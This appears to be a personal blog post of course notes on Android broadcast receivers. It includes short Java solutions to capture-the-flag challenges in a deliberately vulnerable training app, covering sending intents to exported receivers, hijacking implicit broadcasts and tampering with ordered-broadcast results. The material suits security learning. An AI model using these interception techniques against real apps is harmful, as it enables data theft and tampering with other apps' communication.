---
layout: post
title: Broadcast Receivers
date: 2025-03-27 16:24 +0200
categories: Hextree-Android-Course
tags: android hextree
---
# **Basic Broadcast Receivers**

There are two ways how [broadcast receivers](https://developer.android.com/reference/android/content/BroadcastReceiver) could be used by an app. First they could be exported via the `AndroidManifest.xml` with a `<receiver>` tag.

The other way is by dynamically registering a receiver class using [`registerReceiver()`](https://developer.android.com/reference/android/content/Context#registerReceiver(android.content.BroadcastReceiver,%20android.content.IntentFilter)).

As an example we can look at the [AntennaPod](https://play.google.com/store/apps/details?id=de.danoeh.antennapod&hl=en) app how it uses broadcast receivers. We are going to use this app as an example throughout this course, so make sure to download it.

---

# **Sending Broadcasts**

You can also practice basic broadcast interaction with the Intent Attack Surface app. Try to send a broadcast to the exported `Flag16Receiver` and trigger the call to `success()`.

```java
Intent intent = new Intent();
intent.setClassName("io.hextree.attacksurface",
        "io.hextree.attacksurface.receivers.Flag16Receiver");
intent.putExtra("flag", "give-flag-16");
sendBroadcast(intent);
```

---

# **System Event Broadcasts**

There exist several broadcast actions that are used by the system - obviously regular apps are not allowed to send them. But that doesn't mean the receivers that handle these are properly protected.

Maybe if you make change in the action string it will work 

---

# **Intercept and Redirecting Broadcasts**

## **Hijack Broadcasts**

Lots of concepts we have learned about for regular activity intents can also be applied to broadcast receivers. For example hijacking implicit intents. Can you intercept the broadcast sent by the `Flag18Activity` to get the flag?

```java
BroadcastReceiver receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                setResultCode(2);
                setResultData("kero"); 
            }
        };
        registerReceiver(receiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"));
```

## **Malicious Return Values**

With activities we have seen that an activity can also return a result back to the caller. With broadcasts there is also a way to handle responses which is additional attack surface.

```java
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface",
                "io.hextree.attacksurface.receivers.Flag17Receiver");
        String FlagSecret = "give-flag-17";
        intent.putExtra("flag", FlagSecret);
        sendOrderedBroadcast(intent, null);
```

---

# **Home Screen App Widgets**

[Widgets](https://developer.android.com/develop/ui/views/appwidgets#drawablemy_widget_background.xml) are a cool feature allowing apps to create small user interfaces that get directly embedded on the home screen. This means the widgets are actually running within another app!

The [`AppWidgetProvider`](https://developer.android.com/reference/android/appwidget/AppWidgetProvider) is actually a wrapper around [`BroadcastReceiver`](https://developer.android.com/reference/android/content/BroadcastReceiver) to update the widget data in the background. It can also handle interactions with the widget such as button presses. But because the widget is running inside the home screen, broadcast `PendingIntents` are used to handle the button presses.

---

# **The Notification System**

Notifications can be easily [created](https://developer.android.com/develop/ui/views/notifications/build-notification) using the notification builder. Inside of notifications you can also add button actions by preparing a `PendingIntent`. The reason for that is because the notification is again handled by a different app.

**THANKS FOR READING ❤️**

<script src="https://giscus.app/client.js"
        data-repo="0xk3r0/0xk3r0.github.io"
        data-repo-id="R_kgDOOGw3bQ"
        data-category="General"
        data-category-id="DIC_kwDOOGw3bc4CobRY"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="bottom"
        data-theme="dark"
        data-lang="en"
        crossorigin="anonymous"
        async>
</script>
